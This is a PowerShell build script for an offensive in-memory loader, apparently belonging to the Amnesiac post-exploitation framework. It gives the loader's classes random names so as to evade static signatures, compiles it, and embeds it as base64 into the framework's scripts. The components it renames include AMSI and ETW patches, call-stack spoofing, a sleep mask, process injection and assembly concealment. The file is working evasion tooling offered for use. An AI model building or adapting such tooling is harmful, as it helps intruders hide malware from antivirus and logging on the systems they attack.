# AmnesiacLoader Build Script -- randomizes all public names at compile time
# Usage: cd AmnesiacLoader; .\Build.ps1 [-AmnesiacPath ..\Amnesiac.ps1] [-ShellReadyPath ..\Amnesiac_ShellReady.ps1]
param(
    [string]$AmnesiacPath   = "..\Amnesiac.ps1",
    [string]$ShellReadyPath = "..\Amnesiac_ShellReady.ps1"
)
$ErrorActionPreference = "Stop"

$csc    = "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe"
$binDir = Join-Path $PSScriptRoot "bin"
if (-not (Test-Path $binDir)) { New-Item -Path $binDir -ItemType Directory | Out-Null }

# Resolve paths (handles relative ..\Amnesiac.ps1 from AmnesiacLoader\)
$AmnesiacPath   = [System.IO.Path]::GetFullPath([System.IO.Path]::Combine($PSScriptRoot, $AmnesiacPath))
$ShellReadyPath = [System.IO.Path]::GetFullPath([System.IO.Path]::Combine($PSScriptRoot, $ShellReadyPath))

# ── Random identifier generator ───────────────────────────────────────────────
function New-RandId([int]$len = 10) {
    $alpha = 'abcdefghijkmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ'
    $alnum = $alpha + '23456789'
    $first = $alpha[(Get-Random -Maximum $alpha.Length)]
    $rest  = -join ((1..($len - 1)) | ForEach-Object { $alnum[(Get-Random -Maximum $alnum.Length)] })
    "$first$rest"
}

# ── Generate random names ─────────────────────────────────────────────────────
# Public -- need PS-side map variables in Amnesiac.ps1
$_ns   = New-RandId 10  # namespace + assembly name
$_stp  = New-RandId 10  # Stomper class
$_conc = New-RandId 10  # ConcealLoadedAssembly method
$_inj  = New-RandId 10  # Injector class
$_inPS = New-RandId 10  # InjectUnmanagedPS method
$_spwn = New-RandId 10  # SpawnUnmanagedPS method
$_nl   = New-RandId 10  # NativeLoader class
$_nlLd = New-RandId 10  # NativeLoader.Load method

# Internal -- C# only, still randomized to avoid static signatures
$_sm   = New-RandId 10  # SleepMask class
$_ms   = New-RandId 10  # MaskedSleep method
$_byp  = New-RandId 10  # Bypass class
$_par  = New-RandId 10  # PatchAmsiReflection
$_ppg  = New-RandId 10  # PatchAmsiPageGuard
$_phb  = New-RandId 10  # PatchAmsiHardwareBreakpoint
$_pew  = New-RandId 10  # PatchEtwEventWrite
$_cs   = New-RandId 10  # CallStack class
$_gg   = New-RandId 10  # GetGadget method
$_kgg  = New-RandId 10  # GetKernelbaseGadget method
$_sf   = New-RandId 10  # SpoofFrames method
$_sr   = New-RandId 10  # SyscallResolver class
$_ups  = New-RandId 10  # UnmanagedPS class

Write-Host "[*] Generated random namespace: $_ns" -ForegroundColor Cyan

# ── Substitution table (longest names first to avoid partial-match collisions) ─
$subs = [ordered]@{
    'AmnesiacLoader'              = $_ns
    'ConcealLoadedAssembly'       = $_conc
    'PatchAmsiHardwareBreakpoint' = $_phb
    'GetKernelbaseGadget'         = $_kgg
    'InjectUnmanagedPS'           = $_inPS
    'SpawnUnmanagedPS'            = $_spwn
    'PatchAmsiPageGuard'          = $_ppg
    'PatchAmsiReflection'         = $_par
    'PatchEtwEventWrite'          = $_pew
    'SyscallResolver'             = $_sr
    'NativeLoader'                = $_nl
    'SleepMask'                   = $_sm
    'MaskedSleep'                 = $_ms
    'SpoofFrames'                 = $_sf
    'CallStack'                   = $_cs
    'UnmanagedPS'                 = $_ups
    'GetGadget'                   = $_gg
    'Injector'                    = $_inj
    'Stomper'                     = $_stp
}

# ── Copy sources to temp dir and apply substitutions ─────────────────────────
$tmpDir = Join-Path $env:TEMP ("alb_" + [guid]::NewGuid().ToString("N").Substring(0, 8))
New-Item -Path $tmpDir -ItemType Directory | Out-Null

$sourceFiles = @("Loader.cs","Bypass.cs","CallStack.cs","SleepMask.cs","Stomper.cs","UnmanagedPS.cs","NativeLoader.cs")
$tmpSources  = @()

foreach ($src in $sourceFiles) {
    $srcPath = Join-Path $PSScriptRoot $src
    $dstPath = Join-Path $tmpDir $src
    $content = [System.IO.File]::ReadAllText($srcPath, [System.Text.Encoding]::UTF8)

    foreach ($kvp in $subs.GetEnumerator()) {
        $pattern = "\b" + [System.Text.RegularExpressions.Regex]::Escape($kvp.Key) + "\b"
        $content = [System.Text.RegularExpressions.Regex]::Replace($content, $pattern, $kvp.Value)
    }

    # Rename standalone 'Load' method in NativeLoader.cs only
    # Word-boundary safe: LoadLibrary won't match \bLoad\b
    if ($src -eq "NativeLoader.cs") {
        $content = [System.Text.RegularExpressions.Regex]::Replace($content, '\bLoad\b', $_nlLd)
    }

    [System.IO.File]::WriteAllText($dstPath, $content, [System.Text.Encoding]::UTF8)
    $tmpSources += $dstPath
}

# ── Compile ───────────────────────────────────────────────────────────────────
$outDll  = Join-Path $binDir "$_ns.dll"
$refs    = @("/r:System.dll", "/r:System.Core.dll")
$cscArgs = @("/target:library", "/out:$outDll", "/unsafe", "/optimize+", "/debug-") + $refs + $tmpSources

Write-Host "[*] Compiling $_ns.dll ..." -ForegroundColor Cyan
$result = & $csc @cscArgs 2>&1
Remove-Item $tmpDir -Recurse -Force

if ($LASTEXITCODE -ne 0) {
    Write-Host "[-] Build failed:" -ForegroundColor Red
    $result | ForEach-Object { Write-Host $_ }
    exit 1
}

$bytes  = [System.IO.File]::ReadAllBytes($outDll)
$b64    = [Convert]::ToBase64String($bytes)
$sha256 = (Get-FileHash $outDll -Algorithm SHA256).Hash

Write-Host "[+] Built: $outDll  ($($bytes.Length) bytes)" -ForegroundColor Green
Write-Host "[+] SHA256: $sha256" -ForegroundColor Green

# ── Build the AL-MAP replacement block ───────────────────────────────────────
$mapBlock = "# !!AL-MAP-BEGIN!! Generated by AmnesiacLoader\Build.ps1 -- do not edit manually`n" +
            "`$AmnesiacLoaderB64 = `"$b64`"`n" +
            "`$_alNs   = `"$_ns`"`n" +
            "`$_alStp  = `"$_stp`"`n" +
            "`$_alConc = `"$_conc`"`n" +
            "`$_alInj  = `"$_inj`"`n" +
            "`$_alInPS = `"$_inPS`"`n" +
            "`$_alSpwn = `"$_spwn`"`n" +
            "`$_alNL   = `"$_nl`"`n" +
            "`$_alNLLd = `"$_nlLd`"`n" +
            "# !!AL-MAP-END!!"

# ── Update marker block in a PS file ─────────────────────────────────────────
function Update-AlMap([string]$FilePath) {
    $content = [System.IO.File]::ReadAllText($FilePath, [System.Text.Encoding]::UTF8)
    $pattern = '(?s)# !!AL-MAP-BEGIN!!.*?# !!AL-MAP-END!!'
    if ([System.Text.RegularExpressions.Regex]::IsMatch($content, $pattern)) {
        # Escape $ -> $$ so .NET Regex.Replace doesn't interpret $_ as "entire input"
        $safeBlock = $mapBlock.Replace('$', '$$')
        $updated = [System.Text.RegularExpressions.Regex]::Replace($content, $pattern, $safeBlock)
        $utf8Bom = New-Object System.Text.UTF8Encoding $true
        [System.IO.File]::WriteAllText($FilePath, $updated, $utf8Bom)
        Write-Host "[+] Updated AL-MAP in $FilePath" -ForegroundColor Green
    } else {
        Write-Host "[!] !!AL-MAP-BEGIN!! marker not found in $FilePath" -ForegroundColor Yellow
        Write-Host "    The header block must contain the # !!AL-MAP-BEGIN!! and # !!AL-MAP-END!! lines." -ForegroundColor Yellow
    }
}

Update-AlMap $AmnesiacPath
Update-AlMap $ShellReadyPath

Write-Host "[+] Done. Namespace: $_ns" -ForegroundColor Green
